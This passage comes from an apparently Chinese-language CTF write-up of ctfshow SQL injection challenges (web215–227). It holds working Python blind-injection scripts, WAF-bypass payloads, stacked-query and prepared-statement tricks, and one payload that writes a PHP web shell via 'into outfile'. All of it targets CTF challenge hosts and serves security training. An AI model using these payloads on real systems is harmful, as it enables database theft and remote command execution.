payload,</span><br><span class="line">            <span class="string">&quot;debug&quot;</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        res = requests.post(url=url, data=data).text</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        sub = end_time - start_time</span><br><span class="line">        <span class="keyword">if</span> sub &gt;= <span class="number">0.5</span>:</span><br><span class="line">            flag += mid</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">if</span> mid == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>下一题开始就改官方脚本了, 我写了一个好看点的放在<strong>附录</strong>了</p><h2 id="web215"><a class="header-anchor" href="#web215">¶</a>web215</h2><ul><li>描述: 同上</li></ul><p>查询语句: 用了单引号, 可以在返回包看到确实有</p><p>但是只需要在前面闭合语句即可, 完整的我就不写了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or if(2&gt;1,sleep(5),1)#</span><br></pre></td></tr></table></figure><p>payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select flagaa from ctfshow_flagxc</span><br></pre></td></tr></table></figure><h2 id="web216"><a class="header-anchor" href="#web216">¶</a>web216</h2><ul><li>描述: 同上</li></ul><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 查询语句</span><br><span class="line">where ip = from_base64($id);</span><br></pre></td></tr></table></figure><p>没有单引号, 不过增加了base64解码, 可以将整个payload进行base64编码后发包, 不过直接闭合更快:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;1&#x27;) or if(2&gt;1,sleep(5),1)#</span><br></pre></td></tr></table></figure><p>加在语句前面即可, payload如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select flagaac from ctfshow_flagxcc</span><br></pre></td></tr></table></figure><h2 id="web217"><a class="header-anchor" href="#web217">¶</a>web217</h2><ul><li>描述: 同上</li></ul><p>查询语句换回了<code>where ip =($id);</code></p><p>sleep被过滤, 可以利用benchmark进行大批量运算来实现延时, 记得先测试服务器的延时, <strong>过大会导致服务器崩溃</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) or if(2&gt;1, benchmark(1500000,md5(1)), 1)#</span><br></pre></td></tr></table></figure><p>测试了半天超时的时机, 我认为我这个是可以跑的了, 不行的话多试几次超时时间和运算的数量级</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">res_judge</span>(<span class="params">url, payload</span>):</span><br><span class="line">    <span class="comment"># 发送请求并判断响应时间是否足够长, 以确认匹配</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: payload,</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        time.sleep(<span class="number">1</span>)<span class="comment"># 这个sleep有时候不加也行</span></span><br><span class="line">        res = requests.post(url=url, data=data, timeout=<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] Payload: <span class="subst">&#123;payload&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.RequestException <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[!] Error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">the_length</span>(<span class="params">url, query</span>):</span><br><span class="line">    <span class="comment"># 确定查询结果的长度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">80</span>):</span><br><span class="line"></span><br><span class="line">        payload = <span class="string">f&quot;1) or if((length((<span class="subst">&#123;query&#125;</span>)))=<span class="subst">&#123;i&#125;</span>,benchmark(1500000,md5(1)),1)#&quot;</span></span><br><span class="line">        <span class="comment"># if((length((&#123;query&#125;)))=&#123;length&#125;,sleep(2),1)&amp;debug=1</span></span><br><span class="line">        <span class="keyword">if</span> res_judge(url, payload):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] Found the length: <span class="subst">&#123;i&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> i</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化</span></span><br><span class="line">url = <span class="string">&quot;http://d31de088-4bd3-430b-b266-d60ace1108b9.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;,_&#123;&#125;-abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># query = &quot;select database()&quot;</span></span><br><span class="line"><span class="comment"># query = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line"><span class="comment"># query = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagxccb&#x27;&quot;</span></span><br><span class="line">query = <span class="string">&quot;select flagaabc from ctfshow_flagxccb&quot;</span></span><br><span class="line"></span><br><span class="line">length = the_length(url, query)</span><br><span class="line"><span class="keyword">if</span> length:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> mid <span class="keyword">in</span> flagstr:</span><br><span class="line"></span><br><span class="line">            payload = <span class="string">f&quot;1) or if((substr((<span class="subst">&#123;query&#125;</span>),<span class="subst">&#123;i&#125;</span>,1)=&#x27;<span class="subst">&#123;mid&#125;</span>&#x27;),benchmark(1500000,md5(1)),1)#&quot;</span></span><br><span class="line">            <span class="keyword">if</span> res_judge(url, payload):</span><br><span class="line">                flag += mid</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[+] Found <span class="subst">&#123;i&#125;</span>th character: <span class="subst">&#123;mid&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;[-] The String: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[!] Error occurred: length return none, please check your payload or run last payload again&quot;</span>)</span><br><span class="line">    exit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web218"><a class="header-anchor" href="#web218">¶</a>web218</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>没事, 我们还有方法, 做笛卡尔积运算进行延时, 把sleep换成下面这个:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(select count(*) from ((information_schema.columns)A, (information_schema.columns)B, (information_schema.columns limit 1,7)c) limit 1)</span><br></pre></td></tr></table></figure><p>没有使用任何连接条件的两个表, 数据库会执行笛卡尔积操作, 所以构造为:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1) and if(substr((select flagaac from ctfshow_flagxc),&#123;j&#125;,1)=&#x27;&#123;i&#125;&#x27;,\</span><br><span class="line">(select count(*)from ( \</span><br><span class="line">(select table_name from information_schema.columns)a,\</span><br><span class="line">(select table_name from information_schema.columns)b,\</span><br><span class="line">(select table_name from information_schema.columns limit 1,7)c)limit 1\</span><br><span class="line">),1</span><br></pre></td></tr></table></figure><p>我自己的怎么搞都不行, 大概率是网络问题, 还是用官方的吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://0b70243d-1a8e-472f-98eb-428504c08b1a.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;,_&#123;&#125;-abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(substr((select flagaac from ctfshow_flagxc),<span class="subst">&#123;j&#125;</span>,1)=&#x27;<span class="subst">&#123;i&#125;</span>&#x27;,\</span></span><br><span class="line"><span class="string">(select count(*) from ( \</span></span><br><span class="line"><span class="string">(select table_name from information_schema.columns)a, \</span></span><br><span class="line"><span class="string">(select table_name from information_schema.columns)b, \</span></span><br><span class="line"><span class="string">(select table_name from information_schema.columns limit 1,7)c) limit 1 \</span></span><br><span class="line"><span class="string">),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>更换完网络官方的可以跑了, 我的跑不了</p></blockquote><h2 id="web219"><a class="header-anchor" href="#web219">¶</a>web219</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark|rlike/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure><p>上一题没有用rlike, 可以继续用上一题的</p><p>rlike和regexp类似, 是正则的方式, 如果感兴趣可以看这个, 这个是web190的脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> post</span><br><span class="line"><span class="keyword">from</span> string <span class="keyword">import</span> digits, ascii_lowercase</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://591b6da2-b965-4ff3-a8f4-826f177ed92d.challenge.ctf.show/api/&#x27;</span></span><br><span class="line"><span class="comment"># 数据库值: ctfshow_web</span></span><br><span class="line"><span class="comment"># payload = &#x27;admin\&#x27; and (select database()) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"><span class="comment"># 表名: ctfshow_fl0g</span></span><br><span class="line"><span class="comment"># payload = &#x27;admin\&#x27; and (select group_concat(table_name) from information_schema.tables where table_schema = database()) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"><span class="comment"># 字段: id,f10g</span></span><br><span class="line"><span class="comment"># payload = &#x27;admin\&#x27; and (select group_concat(column_name) from information_schema.columns where table_schema = database() and table_name = \&#x27;ctfshow_fl0g\&#x27;) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line"><span class="comment"># 拿到flag: ctfshow&#123;f8302835-ac04-49e8-ba2c-4ee474890ac4&#125;</span></span><br><span class="line">payload = <span class="string">&#x27;admin\&#x27; and (select f1ag from ctfshow_fl0g) regexp \&#x27;&#123;&#125;\&#x27; #&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"><span class="comment"># flag需要修改, 不能留空</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;-&#125;_&#x27;</span> + digits + ascii_lowercase:</span><br><span class="line">            resp = post(url, &#123;<span class="string">&#x27;username&#x27;</span>: payload.<span class="built_in">format</span>(flag + c), <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;123&#x27;</span>&#125;)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;密码错误&#x27;</span> <span class="keyword">in</span> resp.json().get(<span class="string">&#x27;msg&#x27;</span>):</span><br><span class="line">                flag += c</span><br><span class="line">                <span class="built_in">print</span>(flag)</span><br><span class="line">                <span class="keyword">if</span> c == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                    exit()</span><br><span class="line">                <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web220"><a class="header-anchor" href="#web220">¶</a>web220</h2><ul><li>描述: 盲注结束</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>你已经做过前面的题了, 你肯定知道可以用left等代替, 直接更改上题payload即可</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://f70e6dcc-fcff-4bf8-b847-89719dd425bd.challenge.ctf.show/api/&quot;</span></span><br><span class="line">flagstr = <span class="string">&quot;,_&#123;&#125;-abcdefghijklmnopqrstuvwxyz0123456789&quot;</span></span><br><span class="line"></span><br><span class="line">j = <span class="number">1</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flagstr:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span>: <span class="string">f&quot;1) and if(left((select flagaabcc from ctfshow_flagxcac),<span class="subst">&#123;j&#125;</span>)=&#x27;<span class="subst">&#123;res+i&#125;</span>&#x27;,\</span></span><br><span class="line"><span class="string">(select count(*) from ( \</span></span><br><span class="line"><span class="string">(select table_name from information_schema.columns)a, \</span></span><br><span class="line"><span class="string">(select table_name from information_schema.columns)b, \</span></span><br><span class="line"><span class="string">(select table_name from information_schema.columns limit 1,7)c) limit 1 \</span></span><br><span class="line"><span class="string">),1&quot;</span>,</span><br><span class="line">            <span class="string">&#x27;debug&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            r = requests.post(url, data=data, timeout=<span class="number">2.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            res += i</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web221"><a class="header-anchor" href="#web221">¶</a>web221</h2><ul><li>描述: 开始其他注入</li></ul><p>这个似乎叫做limit注入, <a href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">P神转载的文章</a>, <a href="https://www.jianshu.com/p/6c1420a7a7d9">mysql注入之limit注入</a></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">  <span class="comment">//分页查询</span></span><br><span class="line">  <span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user <span class="title function_ invoke__">limit</span> (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>,<span class="variable">$limit</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br><span class="line"><span class="comment">//拿到数据库名字就算你赢</span></span><br></pre></td></tr></table></figure><p>此方法适用于MySQL 5.x中，在limit语句后面的注入</p><p>在官方的select语句解释中, <code>limit</code>后可以跟<code>procedure</code>和<code>into</code>, 可以利用<code>procedure</code>进行注入</p><p>给出的示例中是结合了报错注入进行的注入, 据说还可以时间注入:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT field FROM user WHERE id &gt;0 ORDER BY id LIMIT 1,1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1); </span><br></pre></td></tr></table></figure><blockquote><p>本地测试跑不出来, 一直在报错</p><p>然后如果传入id, 回显中就没有回显, 可能是查询语句中并没有id?</p></blockquote><p>唉不管了直接套, 反正能出来就行</p><p><img src="https://cdn.jsdelivr.net/gh/4reexile/Misc_/images/md/image-20240816230632825.png" alt="image-20240816230632825"></p><p>然后结合盲注修改语句即可得到数据库名<code>ctfshow_web_flag_x</code>, 提交数据库名即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?page=10&amp;limit=10%20procedure%20analyse(extractvalue(rand(),concat(0x3a,database())),1);</span><br></pre></td></tr></table></figure><h2 id="web222"><a class="header-anchor" href="#web222">¶</a>web222</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="comment">//分页查询</span></span><br><span class="line"> <span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br></pre></td></tr></table></figure><p>group by注入, 抓包发现传入的主要参数是<code>?u=</code></p><p>这个注入似乎有报错注入和盲注两种方法的:</p><p><a href="https://www.cnblogs.com/02SWD/p/CTF-sql-group_by.html">报错注入1</a>, <a href="https://www.secpulse.com/archives/140616.html">报错注入2</a></p><blockquote><p>又好像不对, 对, 对吗?</p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Author: gkjzjh146</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">url = <span class="string">&#x27;http://464941b6-2b80-40a5-9f5b-8560cf7fd664.challenge.ctf.show/api/?u=&#x27;</span></span><br><span class="line">url2 = <span class="string">&#x27; &amp;page=1&amp;limit=10&#x27;</span></span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">60</span>):</span><br><span class="line">    <span class="built_in">min</span>,<span class="built_in">max</span> = <span class="number">32</span>, <span class="number">128</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        j = <span class="built_in">min</span> + (<span class="built_in">max</span>-<span class="built_in">min</span>)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">min</span> == j:</span><br><span class="line">            <span class="built_in">str</span> += <span class="built_in">chr</span>(j)</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">str</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="comment"># 爆表名</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.05),&#x27;False&#x27;)&quot;</span></span><br><span class="line">        <span class="comment"># 爆列</span></span><br><span class="line">        <span class="comment"># payload = f&quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flaga&#x27;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.05),&#x27;False&#x27;)&quot;</span></span><br><span class="line">        <span class="comment"># 爆值</span></span><br><span class="line">        payload = <span class="string">f&quot;if(ascii(substr((select group_concat(flagaabc) from ctfshow_flaga),<span class="subst">&#123;i&#125;</span>,1))&lt;<span class="subst">&#123;j&#125;</span>,sleep(0.05),&#x27;False&#x27;)&quot;</span></span><br><span class="line">        url0 = url + payload + url2</span><br><span class="line">        start_time = time.time()</span><br><span class="line">        r = requests.get(url=url0).text</span><br><span class="line">        end_time = time.time()</span><br><span class="line">        sub = end_time - start_time</span><br><span class="line">        <span class="keyword">if</span> sub &gt;= <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">max</span> = j</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">min</span> = j</span><br></pre></td></tr></table></figure><h2 id="web223"><a class="header-anchor" href="#web223">¶</a>web223</h2><ul><li>描述: 同上</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br><span class="line"><span class="comment">//用户名不能是数字</span></span><br></pre></td></tr></table></figure><p>原理如下:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?u=if(&#x27;a&#x27;=&#x27;a&#x27;,username,&#x27;a&#x27;)</span><br><span class="line">?u=if(&#x27;a&#x27;=&#x27;b&#x27;,username,&#x27;a&#x27;)</span><br></pre></td></tr></table></figure><p>通过生成数字的函数，就原有的脚本进行了数字编码</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generateNum</span>(<span class="params">num</span>):</span><br><span class="line">    res = <span class="string">&#x27;true&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> num == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num - <span class="number">1</span>):</span><br><span class="line">            res += <span class="string">&quot;+true&quot;</span></span><br><span class="line">        <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://ff765902-0dec-4688-8cd2-1a4cc429d30a.chall.ctf.show/api/&quot;</span></span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">res = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    head = <span class="number">32</span></span><br><span class="line">    tail = <span class="number">127</span></span><br><span class="line">    i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> head &lt; tail:</span><br><span class="line">        mid = (head + tail) &gt;&gt; <span class="number">1</span></span><br><span class="line">        <span class="comment"># 查数据库-ctfshow_flagas</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(table_name) from information_schema.tables where table_schema=database()&quot;</span></span><br><span class="line">        <span class="comment"># 查字段-flagasabc</span></span><br><span class="line">        <span class="comment"># payload = &quot;select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_flagas&#x27;&quot;</span></span><br><span class="line">        <span class="comment"># 查flag</span></span><br><span class="line">        payload = <span class="string">&quot;select flagasabc from ctfshow_flagas&quot;</span></span><br><span class="line">        params = &#123;</span><br><span class="line">            <span class="string">&quot;u&quot;</span>: <span class="string">f&quot;if(ascii(substr((<span class="subst">&#123;payload&#125;</span>),<span class="subst">&#123;generateNum(i)&#125;</span>,<span class="subst">&#123;generateNum(<span class="number">1</span>)&#125;</span>))&gt;<span class="subst">&#123;generateNum(mid)&#125;</span>,username,&#x27;a&#x27;)&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        r = requests.get(url, params=params)</span><br><span class="line">        <span class="comment"># print(r.json()[&#x27;data&#x27;])</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;userAUTO&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            head = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            tail = mid</span><br><span class="line">    <span class="keyword">if</span> head != <span class="number">32</span>:</span><br><span class="line">        res += <span class="built_in">chr</span>(head)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="web224"><a class="header-anchor" href="#web224">¶</a>web224</h2><ul><li>描述: 老面孔了，懂得都懂</li></ul><p>是登录界面, 先扫一扫以示敬意; 发现有<code>upload.php</code>, <code>robots.txt</code>, <code>checklogin.php</code></p><p>只有中间的能访问, 可以得到<code>pwdreset.php</code>, 发现是密码重置系统而且没有任何验证, 直接重置即可</p><p>登录后发现上传点, 不知道检查了什么, 可以上传zip; 在上传后的回显是两个参数<code>filetype</code>和<code>filename</code>, 应该就是这个两个存在sql注入</p><blockquote><ul><li>filename:29dc15c857c395f32893748c350100f8.zip filetype:Zip archive data, at least v2.0 to extract</li></ul></blockquote><p>会检测filetype, 构造的语句需要加一个文件头上去而且不能在过滤名单里</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C64File &quot;&#x27;);select 0x3c3f3d60245f4745545b315d603f3e into outfile &#x27;/var/www/html/1.php&#x27;;--+</span><br><span class="line"># 十六进制是 &lt;?=`$_GET[1]`?&gt;</span><br></pre></td></tr></table></figure><p>将上述字符串塞进txt文件就能上传, 返回的filetype是PC64啥的, 现在可以访问<code>1.php</code>执行命令了</p><blockquote><p>我这里似乎执行不了, 返回为空? 以后再来试试</p></blockquote><h2 id="web225"><a class="header-anchor" href="#web225">¶</a>web225</h2><ul><li>描述: 堆叠提升开始</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,username,pass from ctfshow_user where username = &#x27;<span class="subst">&#123;$username&#125;</span>&#x27;;&quot;</span>;</span><br><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以用两种方法: Handler和预处理</p><p>handler语句让我们能够一行一行的浏览一个表中的数据, 但是它仅在mysql存在且不包含select的完整功能</p><p>利用handler查询, 再结合我们的show就可以绕过了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/api/?username=1&#x27;;show%20tables;%23</span><br><span class="line"># 查到 ctfshow_flagasa</span><br><span class="line">/api/?username=1&#x27;;handler%20`ctfshow_flagasa`%20open;handler%20`ctfshow_flagasa`%20read%20first;%23</span><br><span class="line"># 查到flag</span><br></pre></td></tr></table></figure><p>预处理就是定义一串sql查询语句为一个名字, 然后直接通过这个名字来运行该查询语句:</p><p>标准格式如下, 但是我没测试出来</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PREPARE name from &#x27;[my sql sequece]&#x27;;   </span><br><span class="line"># 预定义SQL语句</span><br><span class="line">EXECUTE name;  </span><br><span class="line"># 执行预定义SQL语句</span><br><span class="line">(DEALLOCATE || DROP) PREPARE name;  </span><br><span class="line">#删除预定义SQL语句</span><br></pre></td></tr></table></figure><p>测试一下, 不要最后那个&quot;删除预定义语句&quot;即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;prepare h from concat(&#x27;selec&#x27;,&#x27;t * from ctfshow_flagasa&#x27;);execute h;%23</span><br></pre></td></tr></table></figure><h2 id="web226"><a class="header-anchor" href="#web226">¶</a>web226</h2><ul><li>描述: 堆叠提升</li></ul><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//师傅说过滤的越多越好</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/file|into|dump|union|select|update|delete|alter|drop|create|describe|set|show|\(/i&#x27;</span>,<span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>预处理配合16进制即可查询:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27;;prepare h from 0x73686f77207461626c6573;execute h;%23</span><br><span class="line"># 查表 ctfsh_ow_flagas</span><br><span class="line">1&#x27;;prepare h from 0x73656c656374202a2066726f6d2063746673685f6f775f666c61676173;execute h;%23</span><br><span class="line"># 拿到flag</span><br></pre></td></tr></table></figure><h2 id="web227"><a class="header-anchor" 